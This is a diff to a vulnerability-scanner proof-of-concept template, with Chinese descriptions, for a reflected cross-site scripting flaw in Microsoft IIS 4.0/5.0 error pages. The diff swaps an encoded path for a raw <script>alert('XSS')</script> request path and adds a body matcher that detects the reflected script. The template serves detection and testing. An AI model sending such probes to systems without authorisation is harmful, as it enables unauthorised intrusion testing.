@@ -1,8 +1,8 @@
 [info]
 author = "ave"
-description = "Microsoft IIS 4.0/5.0 在处理包含 HTML 标签的 URL 请求时，错误页面未正确转义用户输入，导致跨站脚本攻击。攻击者可构造包含恶意脚本的 URL 诱使受害者访问，在受害者浏览器中执行任意脚本代码。"
+description = "向 IIS 服务器发送包含恶意脚本的特制 URL 请求，触发 404 错误页面反射未转义的脚本内容，验证跨站脚本漏洞存在"
 id = "POC-AVE-2000-2006"
-name = "Microsoft IIS 4.0/5.0 错误消息跨站脚本漏洞 PoC"
+name = "Microsoft IIS 4.0/5.0 错误消息跨站脚本攻击 PoC"
 severity = "high"
 tags = ["ave-2000-2006"]
 vuln_id = [
@@ -11,17 +11,15 @@ vuln_id = [
 ]
 
 [poc]
-logic = "any"
+logic = "all"
 
 [[poc.requests]]
 method = "GET"
-path = "/{{BaseURL}}/%3Cscript%3Ealert(1)%3C/script%3E"
+path = "/{{BaseURL}}/nonexistent<script>alert('XSS')</script>.asp"
 protocol = "http"
 
 [[poc.requests.matchers]]
 expect = true
-status = [
-    404,
-    500,
-]
-type = "status"
+part = "body"
+type = "word"
+words = ["<script>alert('XSS')</script>"]
